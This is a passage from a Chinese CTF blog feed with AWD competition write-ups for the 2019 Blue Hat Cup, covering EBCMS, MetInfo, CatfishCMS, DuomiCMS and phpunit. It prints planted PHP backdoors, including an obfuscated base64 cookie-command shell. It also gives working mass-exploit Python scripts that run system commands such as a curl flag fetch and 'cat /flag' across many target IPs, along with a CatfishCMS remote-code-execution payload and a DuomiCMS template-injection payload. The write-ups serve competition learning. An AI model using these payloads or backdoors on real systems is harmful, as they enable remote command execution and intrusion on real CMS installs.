class="line">public function imgget()&#123;</span><br><span class="line">if(isset($_GET[&apos;ebimgname&apos;]))&#123;</span><br><span class="line">return $this -&gt; success(base64_encode(file_get_contents($_GET[&apos;ebimgname&apos;])));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往下查找<code>success</code>函数定义</p><p><code>/extend/traits/Jump.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">trait Jump&#123;</span><br><span class="line">use \traits\View;</span><br><span class="line"></span><br><span class="line">protected function success($message=&apos;操作成功！&apos;, $url=&apos;&apos;, $data=[])&#123;</span><br><span class="line">if (\Ebcms::isAjax()) &#123;</span><br><span class="line">return \mylib\Response::json([</span><br><span class="line">&apos;code&apos;=&gt;1,</span><br><span class="line">&apos;message&apos;=&gt;$message,</span><br><span class="line">&apos;url&apos;=&gt;$url,</span><br><span class="line">&apos;data&apos;=&gt;$data,</span><br><span class="line">]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return $this -&gt; html($this -&gt; assign([</span><br><span class="line">&apos;code&apos;=&gt;1,</span><br><span class="line">&apos;message&apos;=&gt;$message,</span><br><span class="line">&apos;url&apos;=&gt;$url,</span><br><span class="line">&apos;data&apos;=&gt;$data,</span><br><span class="line">]) -&gt; fetch(__DIR__ . &apos;/tpl/jump.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是一个回显消息的函数，并没有什么异常，猜测应该是通过该类构造一些恶意<code>payload</code>在入口处发生的反序列化漏洞，wtcl。</p><p>然后还找到该版本是一个<code>CNVD-2019-06644</code>。贴上链接。</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-06644" target="_blank" rel="noopener">EBCMS存在任意代码执行漏洞</a></p><h2 id="Web2-Metinfo-6-0-0"><a href="#Web2-Metinfo-6-0-0" class="headerlink" title="Web2-Metinfo-6.0.0"></a>Web2-Metinfo-6.0.0</h2><p><img src="3.png" alt></p><p>这题是2018蓝帽浙江赛区的题目，但做了修改，贴个以前赛区赛题链接</p><p><a href="https://virtua11.github.io/2018/07/03/%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D--%E7%AC%AC%E4%B8%80%E6%AC%A1AWD%E4%B9%8B%E6%97%85/" target="_blank" rel="noopener">“蓝帽杯”–第一次AWD之旅</a></p><p>贴个原版本代码漏洞</p><p><a href="https://badcode.cc/2018/05/26/Metinfo-6-0-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Metinfo 6.0.0 任意文件读取漏洞</a></p><p>拉下来与本地源码对比发现，已有漏洞已被修复</p><p><img src="4.png" alt></p><p>拉下来扫描审计发现有好几个后门以及主办方修改的代码（共六个）</p><p><code>/about/index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># MetInfo Enterprise Content Management System</span><br><span class="line"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.</span><br><span class="line"></span><br><span class="line">define(&apos;M_NAME&apos;, &apos;about&apos;);</span><br><span class="line">define(&apos;M_MODULE&apos;, &apos;web&apos;);</span><br><span class="line">define(&apos;M_CLASS&apos;, &apos;about&apos;);</span><br><span class="line">define(&apos;M_ACTION&apos;, &apos;doabout&apos;);</span><br><span class="line">require_once &apos;../app/system/entrance.php&apos;;</span><br><span class="line">$e = $_REQUEST[&apos;e&apos;];</span><br><span class="line">$arr = array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span><br><span class="line"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>index.php</code>后门<code>@eval($_POST[&#39;a&#39;]);</code>（简单后门就不再多提）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># MetInfo Enterprise Content Management System</span><br><span class="line"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.</span><br><span class="line">if(!file_exists(&apos;./config/install.lock&apos;))&#123;</span><br><span class="line">if(file_exists(&apos;./install/index.php&apos;))&#123;</span><br><span class="line">header(&quot;location:./install/index.php&quot;);exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;);</span><br><span class="line">echo &quot;安装文件不存在，请上传安装文件。如已安装过，请新建config/install.lock文件。&quot;;</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">define(&apos;M_NAME&apos;, &apos;index&apos;);</span><br><span class="line">@eval($_POST[&apos;a&apos;]);</span><br><span class="line">define(&apos;M_MODULE&apos;, &apos;web&apos;);</span><br><span class="line">define(&apos;M_CLASS&apos;, &apos;index&apos;);</span><br><span class="line">define(&apos;M_ACTION&apos;, &apos;doindex&apos;);</span><br><span class="line">require_once &apos;./app/system/entrance.php&apos;;</span><br><span class="line"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span><br><span class="line"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>door.php</code>后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;a&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p><code>/admin/admin/getpassword.php</code>被修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">这里贴部分被修改后的关键代码</span><br><span class="line">$action = $_POST[&apos;action&apos;];</span><br><span class="line">switch($action)&#123;</span><br><span class="line">case &apos;next1&apos;:</span><br><span class="line">if($abt_type==1)&#123;</span><br><span class="line">$description=$lang_password2;</span><br><span class="line">$title=$lang_password3;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$description=$lang_password4;</span><br><span class="line">$title=$lang_password5;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case &apos;debug&apos;:</span><br><span class="line">        $file = addslashes($_POST[&apos;file&apos;]);</span><br><span class="line">        system(&quot;find /tmp -iname &quot;.escapeshellcmd($file));</span><br><span class="line">        break;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>源码是没有取<code>$_POST[&#39;action&#39;]</code>的，这里通过<code>POST</code>取到<code>action</code>，能够进到<code>debug</code>进行文件查找。</p><p><code>admin/system/uploadfile.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">被修改后代码</span><br><span class="line">if($action==&apos;deletefolder&apos;)&#123;</span><br><span class="line">$filedir=&quot;../../&quot;.$filename;</span><br><span class="line">    unlink($filedir);</span><br><span class="line">    metsave($rurls);</span><br><span class="line">&#125;</span><br><span class="line">原代码</span><br><span class="line">if($action==&apos;deletefolder&apos;)&#123;</span><br><span class="line">if(strcasecmp(substr(trim($filename),0,7),&apos;upload/&apos;)!=0)die(&apos;met1&apos;);</span><br><span class="line">if(substr_count(trim($filename),&apos;../&apos;)!=0)die(&apos;met2&apos;);</span><br><span class="line">$filedir=&quot;../../&quot;.$filename;</span><br><span class="line">   deldir($filedir,0);</span><br><span class="line">   metsave($rurls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里被修改后的代码直接导致产生任意文件删除，与源码不同的替换回去修补漏洞即可。</p><p><code>/include/ping.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class getip&#123;</span><br><span class="line">public $ip;</span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;ip = &quot;127.0.0.1&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">echo &apos;The ip is&apos;.$this-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class getresult&#123;</span><br><span class="line">public $obj;</span><br><span class="line">public $ip;</span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;ip = &apos;127.0.0.1&apos;;</span><br><span class="line">$this-&gt;obj = null;</span><br><span class="line">&#125;</span><br><span class="line">function __toString()&#123;</span><br><span class="line">$this-&gt;obj-&gt;execute();</span><br><span class="line">return $this-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class ping&#123;</span><br><span class="line">private $ip;</span><br><span class="line"></span><br><span class="line">function execute()&#123;</span><br><span class="line">$str = &apos;ping &apos;.$this-&gt;ip;</span><br><span class="line">system($str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(base64_decode($_GET[&apos;ip&apos;]));</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>/include/curl.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">        if(isset($_GET[&apos;address&apos;]))&#123;</span><br><span class="line">                $address = $_GET[&apos;address&apos;];</span><br><span class="line">                if(filter_var($address,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                        $filter_url = parse_url($address);</span><br><span class="line">                        if(preg_match(&apos;/127.0.0.1/&apos;,$filter_url[&apos;host&apos;]))&#123;</span><br><span class="line">                                system(&apos;curl -v -s &apos;.$filter_url[&apos;host&apos;]);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里并<code>curl.php</code>没有发现有可疑的地方（直接删除进行防护不碍事），初步猜测是在<code>ping.php</code>有个拼接命令进行执行（路由不清楚，也可以直接删除）。</p><p>后门exp这里不在提供，参考 <a href="http://zo1ro.tk/2019/06/23/blue-hat-2019/" target="_blank" rel="noopener">湖北赛区WP</a></p><h2 id="Web3-CatfishCMS-v4-8-54"><a href="#Web3-CatfishCMS-v4-8-54" class="headerlink" title="Web3-CatfishCMS-v4.8.54"></a>Web3-CatfishCMS-v4.8.54</h2><p><img src="1.png" alt></p><p>最近爆出的一个漏洞CNVD-2019-06255</p><p>参考链接</p><p><a href="https://blog.csdn.net/yun2diao/article/details/91344725" target="_blank" rel="noopener">CatfishCMS任意命令执行导致getshell</a></p><p>可以看到在<code>catfish/library/think/Request.php</code>存在一个变量覆盖函数，通过重新赋值<code>method</code>和<code>$_POST</code>使函数跳转到其他函数去执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[Config::get(&apos;var_method&apos;)])) &#123;</span><br><span class="line">                $this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">                $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>查看<code>application/config.php</code>中<code>var_method</code>默认值，发现是通过<code>_method</code>参数进行赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表单请求类型伪装变量</span><br><span class="line">    &apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br></pre></td></tr></table></figure><p>那么我们就可以赋值<code>_method=__construct</code>使函数跳转到<code>__construct</code>去执行，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($options = [])</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($options as $name =&gt; $item) &#123;</span><br><span class="line">            if (property_exists($this, $name)) &#123;</span><br><span class="line">                $this-&gt;$name = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_null($this-&gt;filter)) &#123;</span><br><span class="line">            $this-&gt;filter = Config::get(&apos;default_filter&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后通过<code>__construct</code>函数重写<code>config</code>参数值，从而<code>getshell</code>。</p><p>最终构成payload</p><p><img src="2.png" alt></p><p>自己跟一遍还是蛮有意思的，主要还是对之前<code>thinkPHP</code>框架的熟悉程度要更加深一些。</p><p>附当时写的流量exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">pattern = re.compile(&apos;key&#123;.*?&#125;&apos;)</span><br><span class="line">for i in range(3,84):</span><br><span class="line">    ips.append(i)</span><br><span class="line"></span><br><span class="line">for i in range(len(ips)):</span><br><span class="line">    ips[i]=ip % ips[i]</span><br><span class="line"></span><br><span class="line">payload = &#123;&apos;s&apos;:&apos;curl http://192.168.100.1/Getkey&apos;,&apos;_method&apos;:&apos;__construct&apos;,&apos;method&apos;:&apos;*&apos;,&quot;filter[]&quot;:&apos;system&apos;&#125;</span><br><span class="line">fake = &#123;&apos;s&apos;:&apos;curl%20http://192.168.100.1/Getkey&apos;,&apos;_method&apos;:&apos;__construct&apos;,&quot;filter[]&quot;:&apos;system&apos;&#125;</span><br><span class="line">cookie = &#123;&apos;PHPSESSID&apos;:&apos;k5obg11niv33qe5t58nb8o34h0&apos;,&apos;think_var&apos;:&apos;zh-cn&apos;&#125;</span><br><span class="line">for ip in ips:</span><br><span class="line">print ip</span><br><span class="line">flag = requests.post(ip,data=payload,cookies=cookie).content</span><br><span class="line">print payload</span><br><span class="line">flag1 = pattern.findall(flag)</span><br><span class="line">if flag1:</span><br><span class="line">print flag1[0]</span><br><span class="line">requests.post(ip,data=fake)</span><br><span class="line">requests.post(ip,data=fake)</span><br><span class="line">requests.post(ip,data=fake)</span><br><span class="line">requests.post(ip,data=fake)</span><br><span class="line">requests.post(ip,data=fake)</span><br><span class="line">time.sleep(0.1)</span><br></pre></td></tr></table></figure><h2 id="AWD比赛中WEB的思路总结"><a href="#AWD比赛中WEB的思路总结" class="headerlink" title="AWD比赛中WEB的思路总结"></a>AWD比赛中WEB的思路总结</h2><p>首先确定是否使用ssh弱密码，准备好修改密码的脚本（python一键执行），可进行全场抓肉机。ssh连接上去后，找到源码目录（find命令查找），备份源码（一般都有tar），拉下源码后用工具全局查找后台密码和数据库密码，然后备份数据库（mysql居多），同时用D盾等工具扫描后门，找到后门后先删除自己的后门，然后用事先写好的通打脚本全场拿分。接下来是常规流程，迅速修改后台密码，上log和waf，在代码审计的同时进行日志审计，一旦有一血产生就审计抓取到的日志，分析出可疑日志进行流量复现。</p><p>代码审计的思路一般是用本地存取的源码对比比赛中的源码，查找不同点，看是否存在主办方插入的漏洞点（几次比赛下来这点非常重要，有源码才能迅速定位主办方漏洞），如果完全一致，就查找该版本是否存在cve（本地记得存取相应poc）。代码审计完后不要忘记修补好漏洞点，写通打脚本全场拿分。审计代码同时不要遗忘运维的重要性，查看是否被人插入不死马，将不死马进程杀死或者写个定时任务循环删除。每一个环节都至关重要，这里不在细说。</p><p>还是那句话，心态要稳，这次由于<code>web</code>较多，操作有点混乱，一旦看到掉分就想着快点补回去（一轮最多400分），导致心态有点崩，还是有些心急了，吸取教训，希望以后能更沉稳一些。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2019蓝帽杯决赛复现&lt;code&gt;Write-up&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Blue-hat-2019湖北赛区WP</title>
    <link href="https://zo1ro.github.io/2019/06/23/blue-hat-2019/"/>
    <id>https://zo1ro.github.io/2019/06/23/blue-hat-2019/</id>
    <published>2019-06-23T14:41:10.000Z</published>
    <updated>2019-06-28T03:03:20.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>这次比赛有两道web，部署在同一台机子中，网站根目录分别存储有 <code>web1</code> , <code>web2</code> 两个网站源码，外部端口分别对应 <code>80</code> , <code>81</code> 两个端口。获取 <code>flag</code> 的方式为 <code>curl http://192.168.100.1/Getkey</code> 。</p> <a id="more"></a><p>前期据说别的赛区出现弱口令密码，需准备好弱口令修改密码自动脚本，这里自己写了一个简陋的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import paramiko</span><br><span class="line">import time</span><br><span class="line">ips = []</span><br><span class="line">ip = &apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  ip = &apos;4.4.%d.100&apos;%i</span><br><span class="line">  ips.append(ip)</span><br><span class="line"></span><br><span class="line">log_file=open(&apos;mpwdok.log&apos;,&apos;a+&apos;)</span><br><span class="line">log_file1=open(&apos;mpwderr.log&apos;,&apos;a+&apos;)</span><br><span class="line"># curl http://192.168.100.1/Getkey</span><br><span class="line"># &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">for ip in ip_list:</span><br><span class="line">    try:</span><br><span class="line">        s = paramiko.Transport((ip, 22))</span><br><span class="line">        # old_password_connect</span><br><span class="line">        s.connect(username=&apos;user&apos;, password=&apos;123456&apos;)</span><br><span class="line">        chan = s.open_session()</span><br><span class="line">        chan.get_pty()</span><br><span class="line">        chan.invoke_shell()</span><br><span class="line">        chan.send(&apos;sudo passwd user\n&apos;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        # new_password_edit</span><br><span class="line">        chan.send(&apos;new_password\n&apos;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        # new_password_edit</span><br><span class="line">        chan.send(&apos;new_password\n&apos;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        log_file.write(&quot;\n&quot;+ip+&quot;\n=================================================================\n&quot;)</span><br><span class="line">        log_file.write(chan.recv(1024))</span><br><span class="line">        log_file.write(&quot;\n=================================================================&quot;)</span><br><span class="line">        print ip + &quot;edit success&quot;</span><br><span class="line">    except Exception,err:</span><br><span class="line">        log_file1.write(&quot;ERR:unable to connect %s:%s\n&quot; %(ip,err))</span><br></pre></td></tr></table></figure><p>索性没用上，进入主题，看题目。</p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p><code>duomi-cms</code></p><p>打包下来进行源码扫描后发现</p><p><code>mobile/.index.php</code> 存在 <code>eval</code> 后门</p><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $b=strrev(&quot;edoced_4&quot;.&quot;6esab&quot;);eval($b(str_replace(&quot; &quot;,&quot;&quot;,&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;))); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>echo</code> 一下 <code>eval</code> 中的内容发现是这一串东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//if(isset($_COOKIE[&apos;cm&apos;]))&#123;ob_start();system(base64_decode($_COOKIE[&apos;cm&apos;]).&apos; 2&gt;&amp;1&apos;);setcookie($_COOKIE[&apos;cn&apos;],$_COOKIE[&apos;cp&apos;].base64_encode(ob_get_contents()).$_COOKIE[&apos;cp&apos;]);ob_end_clean();&#125;</span><br></pre></td></tr></table></figure><p>在 <code>cookie</code> 存在一个后门，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  blue-hat echo &quot;cat /flag&quot;| base64</span><br><span class="line">Y2F0IC9mbGFnCg==</span><br></pre></td></tr></table></figure><p><img src="1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  blue-hat echo &quot;ZmxhZ3toZWxsb193b3JsZCF9Cg&quot; | base64 --decode</span><br><span class="line">flag&#123;hello_world!&#125;%</span><br></pre></td></tr></table></figure><p>附脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line">ips = []</span><br><span class="line">ip = &apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  ip = &apos;http://4.4.%d.100/mobile/.index.php&apos;%i</span><br><span class="line">  ips.append(ip)</span><br><span class="line">cookie = &#123;&apos;_ga&apos;:&apos;GA1.1.916666987.1559659316&apos;,&apos;PHPSESSID&apos;:&apos;fp2euo5vmnude78diq3gace8n4&apos;,&apos;ishistory&apos;:&apos;1&apos;,&apos;__tins__18779617&apos;:&apos;%7B%22sid%22%3A%201561000146802%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201561001946802%7D&apos;,&apos;__51cke__&apos;:&apos;&apos;,&apos; __51laig__&apos;:&apos;1&apos;,&apos;cm&apos;:&apos;Y2F0IC9mbGFnCg==&apos;&#125;</span><br><span class="line">for url in ips:</span><br><span class="line">  print base64.b64decode(requests.get(url,cookies=cookie).headers[&apos;Set-Cookie&apos;][1:].replace(&apos;%3D&apos;,&apos;=&apos;))</span><br></pre></td></tr></table></figure><p>赛后复现参考</p><p><a href="https://www.codercto.com/a/29241.html" target="_blank" rel="noopener">DuomiCMS3.0最新版漏洞挖掘</a></p><p>发现是一个前台 <code>getshell</code> 漏洞，在 <code>duomiphp\core.class.php</code> 文件中使用了 <code>eval</code> 函数，关键在于 <code>parseIf</code> 方法</p><p><img src="7.png" alt></p><p>这里在 <code>search.php</code> 构造 <code>payload</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?searchword=&#123;if:phpinfo()&#125;phpinfo()&#123;end</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>拉下源码发现后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">///var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">eval(&apos;?&gt;&apos; . file_get_contents(&apos;php://input&apos;));</span><br></pre></td></tr></table></figure><p>直接构造 <code>payload</code> </p><p><img src="3.png" alt></p><p>然后写通打脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">ips = []</span><br><span class="line">ip = &apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  ip = &apos;http://4.4.%d.100/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&apos;%i</span><br><span class="line">  ips.append(ip)</span><br><span class="line">payload = &quot;&lt;?php system(\&quot;cat /flag\&quot;);&quot;</span><br><span class="line">for url in ips:</span><br><span class="line">  try:</span><br><span class="line">   res = requests.post(url=url,data=payload)</span><br><span class="line">   if res.status_code ==200:</span><br><span class="line">    print 